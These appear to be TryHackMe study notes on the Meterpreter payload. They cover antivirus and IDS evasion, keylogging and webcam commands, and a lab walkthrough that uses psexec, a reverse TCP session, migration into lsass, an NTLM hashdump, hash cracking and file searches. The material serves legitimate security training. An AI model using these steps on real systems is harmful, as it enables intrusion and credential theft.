# Meterpreter
## Introduction
* Meterpreter is a Metasploit payload.
* Will run on the target system and act as an agent within a command and control architecture.
* Interact with the target OS and files and use Meterpreter's specialised commands.

## How does Meterpreter work?
* Runs in memory (RAM - Random Access Memory) on the target system.
* Does not write itself to the disk on the target.
  * Aims to avoid being detected during antivirus scans.
  * Most antivirus software will scan new files on the disk (e.g. when you download a file from the internet).
  * Meterpreter will be seen as a process and not have a file on the target system.
* Aims to avoid being detected by network-based IPS (Intrusion Prevention System) and IDS (Intrusion Detection System) solutions by using encrypted communication with the server where Metasploit runs.
  * IPS and IDS solutions will not be able to detect its activities if the target organisation does not decrypt and inspect encrypted traffic (e.g. HTTPS) coming to and going out of the local network.
* Process ID (or process identifier) is used by OS to identify running processes.
  * All processes running in Linux or Windows will have a unique ID number.
  * Number is used to interact with the process when the need arises.
    * If it needs to be stopped.
```
meterpreter > getpid 
Current pid: 1304
```
* List processes running on the target system using the `ps` command.
  * PID 1304 is spoolsv.exe and not Meterpreter.exe.
* Looking at DLLs (Dynamic-Link Libraries) used by the Meterpreter process (PID 1304) would not find anything (e.g. no meterpreter.dll).
* Meterpreter will establish an encrypted (TLS) communication channel with the attacker's system.

## Meterpreter Flavours
* Metasploit payloads can be divided into two categories.
  * Inline (also called single).
    * Sent to the target in a single step.
  * Staged.
    * Sent in two steps.
    * An initial part is installed (the stager) and requests the rest of the payload.
    * This allows for a smaller initial payload size. 
* Meterpreter payloads are also divided into staged and inline versions.
* Easiest way to have an idea about available Meterpreter versions could be to list them using msfvenom.
  * Use `msfvenom --list payloads` and grep 'meterpreter' payloads (adding `| grep meterpreter` to the command line).
* Decision on which version of Meterpreter to use will be mostly based on three factors.
  * The target operating system (Is the target operating system Linux or Windows?
    * Is it a Mac device? Is it an Android phone? etc.)
  * Components available on the target system (Is Python installed?
    * Is this a PHP website? etc.)
  * Network connection types you can have with the target system (Do they allow raw TCP connections?
    * Can you only have an HTTPS reverse connection?
    * Are IPv6 addresses not as closely monitored as IPv4 addresses? etc.)
* The choice may also be limited by the exploit if not using Meterpreter as a standalone payload generated by Msfvenom.
* Some exploits will have a default Meterpreter payload. 
```
msf6 > use exploit/windows/smb/ms17_010_eternalblue 
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```       
* Can list other available payloads using the `show payloads` command with any module. 

## Meterpreter Commands
* Typing `help` on any Meterpreter session will list all available commands.
* Commands are built-in tools available on Meterpreter.
* Meterpreter provides three primary categories of tools.
  * Built-in commands
  * Meterpreter tools
  * Meterpreter scripting
* Meterpreter commands are listed under different categories.

 ### Meterpreter commands
* Core commands will be helpful to navigate and interact with the target system.
#### Core commands

| Command | Function
| --- | ---
| `background` | Backgrounds the current session
| `exit` | Terminate the Meterpreter session
| `guid` | Get the session GUID (Globally Unique Identifier)
| `help` | Displays the help menu
| `info` | Displays information about a Post module
| `irb` | Opens an interactive Ruby shell on the current session
| `load` | Loads one or more Meterpreter extensions
| `migrate` | Allows you to migrate Meterpreter to another process
| `run` | Executes a Meterpreter script or Post module
| `sessions` | Quickly switch to another session

#### File system commands

| Command | Function
| --- | ---
| `cd` | Will change directory
| `ls` | Will list files in the current directory (dir will also work)
| `pwd` | Prints the current working directory
| `edit` | Edits a file
| `cat` | Show the contents of a file to the screen
| `rm` | Will delete the specified file
| `search` | Will search for files
| `upload` | Will upload a file or directory
| `download` | Will download a file or directory

#### Networking commands

| Command | Function
| --- | ---
| `arp` | Displays the host ARP (Address Resolution Protocol) cache
| `ifconfig` | Displays network interfaces available on the target system
| `netstat` | Displays the network connections
| `portfwd` | Forwards a local port to a remote service
| `route` | Vew and modify the routing table

#### System commands

| Command | Function
| --- | ---
| `clearev` | Clears the event logs
| `execute` | Executes a command
| `getpid` | Shows the current process identifier
| `getuid` | Shows the user that Meterpreter is running as
| `kill` | Terminates a process
| `pkill` | Terminates processes by name
| `ps` | Lists running processes
| `reboot` | Reboots the remote computer
| `shell` | Drops into a system command shell
| `shutdown` | Shuts down the remote computer
| `sysinfo` | Gets information about the remote system, such as OS

#### Other Commands
* These will be listed under different menu categories in the help menu.

| Command | Function
| --- | ---
| `idletime` | Returns the number of seconds the remote user has been idle
| `keyscan_dump` | Dumps the keystroke buffer
| `keyscan_start` | Starts capturing keystrokes
| `keyscan_stop` | Stops capturing keystrokes
| `screenshare` | Allows you to watch the remote user's desktop in real time
| `screenshot` | Grabs a screenshot of the interactive desktop
| `record_mic` | Records audio from the default microphone for X seconds
| `webcam_chat` | Starts a video chat
| `webcam_list` | Lists webcams
| `webcam_snap` | Takes a snapshot from the specified webcam
| `webcam_stream` | Plays a video stream from the specified webcam
| `getsystem` | Attempts to elevate your privilege to that of local system
| `hashdump` | Dumps the contents of the SAM database

## Post-Exploitation with Meterpreter
* Meterpreter provides many useful commands that facilitate the post-exploitation phase.

### Help
* This command will give a list of all available commands in Meterpreter.

### Meterpreter commands
* `getuid` will display the user with which Meterpreter is currently running.
* Provides an idea of your possible privilege level on the target system.
  * Admin level user like NT AUTHORITY\SYSTEM or a regular user.
```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
* `ps` command will list running processes.
  * PID column will also give the PID information needed to migrate Meterpreter to another process.

### Migrate
* Migrating to another process will help Meterpreter interact with it.
  * Word processor running on the target (e.g. word.exe, notepad.exe, etc.).
  * Can migrate to it and start capturing keystrokes sent by the user to this process.
* Some Meterpreter versions will offer the `keyscan_start`, `keyscan_stop`, and `keyscan_dump` command options to make Meterpreter act like a keylogger.
* Migrating to another process may also help to have a more stable Meterpreter session.
* Type `migrate` command followed by the PID of the desired target process to migrate to any process.
```
meterpreter > migrate 716
[*] Migrating from 1304 to 716...
[*] Migration completed successfully.
```
* May lose privileges if migrating from a higher privileged (e.g. SYSTEM) user to a process started by a lower privileged user (e.g. webserver).

### Hashdump
* Lists the content of the SAM database.
  * SAM (Security Account Manager) database stores user's passwords on Windows systems.
  * Passwords are stored in the NTLM (New Technology LAN Manager) format.
```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```
* Not mathematically possible to 'crack' the hashes.
* May still discover the cleartext password using online NTLM databases or a rainbow table attack.
* Hashes can also be used in Pass-the-Hash attacks to authenticate to other systems that these users can access the same network.

### Search
* Useful to locate files with potentially sensitive information.
```
meterpreter > search -f flag2.txt
Found 1 result...
    c:\Windows\System32\config\flag2.txt (34 bytes)
```
### Shell
* Launches a regular command-line shell on the target system.
* `CTRL+Z` will go back to the Meterpreter shell.
```
meterpreter > shell
Process 2124 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```
## Post-Exploitation Challenge
* Can use the `load` command to leverage additional tools such as Kiwi or even the whole Python language.
```
meterpreter > load python
Loading extension python...Success.
meterpreter > python_execute "print 'TryHackMe Rocks!'"
[+] Content written to stdout:
TryHackMe Rocks!
```
* Post-exploitation phase will have several goals.
  * Gathering further information about the target system.
  * Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on the target system.
  * Privilege escalation.
  * Lateral movement.
```
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
```       
* Running the `help` command after loading a module is always a good idea.
> Use the credentials to simulate an initial compromise over SMB (Server Message Block) (using `exploit/windows/smb/psexec`). Username: ballen / password: Password1
```
root@ip-10-10-159-26:~# msfconsole
msf6 > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set rhosts 10.10.113.225
msf6 exploit(windows/smb/psexec) > set smbuser ballen
msf6 exploit(windows/smb/psexec) > set smbpass Password1
msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.159.26:4444
[*] 10.10.113.225:445 - Connecting to the server...
[*] 10.10.113.225:445 - Authenticating to 10.10.113.225:445 as user 'ballen'...
[*] 10.10.113.225:445 - Selecting PowerShell target
[*] 10.10.113.225:445 - Executing the payload...
[+] 10.10.113.225:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175686 bytes) to 10.10.113.225
[*] Meterpreter session 1 opened (10.10.159.26:4444 -> 10.10.113.225:53643) at 2024-01-01 17:42:37 +0000

meterpreter >
```
1. What is the computer name?
2. What is the target domain?
```
meterpreter > sysinfo
Computer    	: ACME-TEST
OS          	: Windows 2016+ (10.0 Build 17763).
Architecture	: x64
System Language : en_US
Domain      	: FLASH
Logged On Users : 7
Meterpreter 	: x86/windows
```
3. What is the name of the share likely created by the user?
> Use the 'post/windows/gather/enum,_shares' module.  Need to background Meterpreter first and sert the SESSION parameter.
```	
CTRL+Z
Background session 1? [y/N]
msf6 exploit(windows/smb/psexec) > use post/windows/gather/enum_shares
msf6 post(windows/gather/enum_shares) > set SESSION 1
msf6 post(windows/gather/enum_shares) > run

[*] Running module against ACME-TEST (10.10.113.225)
[*] The following shares were found:
[*]     Name: SYSVOL
[*]     Path: C:\Windows\SYSVOL\sysvol
[*]     Remark: Logon server share
[*]     Type: DISK
[*]
[*]     Name: NETLOGON
[*]     Path: C:\Windows\SYSVOL\sysvol\FLASH.local\SCRIPTS
[*]     Remark: Logon server share
[*]     Type: DISK
[*]
[*]     Name: speedster
[*]     Path: C:\Shares\speedster
[*]     Type: DISK
[*]
[*] Post module execution completed
```
4. What is the NTLM hash of the jchambers user?
> Need to migrate to the 'lsass.exe' process first, then run 'hashdump'.
```	
meterpreter > ps | grep lsass.exe
Filtering on 'lsass.exe'
Process List
============
 PID  PPID  Name   	Arch  Session  User             	Path
 ---  ----  ----   	----  -------  ----             	----
 776  648   lsass.exe  x64   0    	NT AUTHORITY\SYSTEM  C:\Windows\System32\lsass.exe

meterpreter > migrate 776
[*] Migrating from 564 to 776...
[*] Migration completed successfully.

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9ac3de200cb4d510fed7610c7037292:::
ballen:1112:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
jfox:1115:aad3b435b51404eeaad3b435b51404ee:c64540b95e2b2f36f0291c3a9fb8b840:::
lnelson:1116:aad3b435b51404eeaad3b435b51404ee:e88186a7bb7980c913dc90c7caa2a3b9:::
erptest:1117:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715:::
ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:c6c85041ee383915bd541ce40b508ff0:::
```
5. What is the cleartext password of the jchambers user?
> Use an online hash checker like crackstation.net.	
Trustno1
6. Where is the "secrets.txt"  file located? (Full path of the file)
```
meterpreter > search -f secrets.txt
ound 1 result...
=================

Path                                                        	Size (bytes)  Modified (UTC)
----                                                        	------------  --------------
c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt  35        	2021-07-30 08:44:27 +0100
```
7. What is the Twitter password revealed in the "secrets.txt" file?
```
meterpreter > cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
	
My Twitter password is KDSvbsw3849!
```
8. Where is the "realsecret.txt" file located? (Full path of the file)
```
meterpreter > search -f realsecret.txt
Found 1 result...
=================

Path                           	Size (bytes)  Modified (UTC)
----                           	------------  --------------
c:\inetpub\wwwroot\realsecret.txt  34        	2021-07-30 09:30:24 +0100
```
9. What is the real secret?
```
meterpreter > cat "c:\inetpub\wwwroot\realsecret.txt"

The Flash is the fastest man alive
```
```
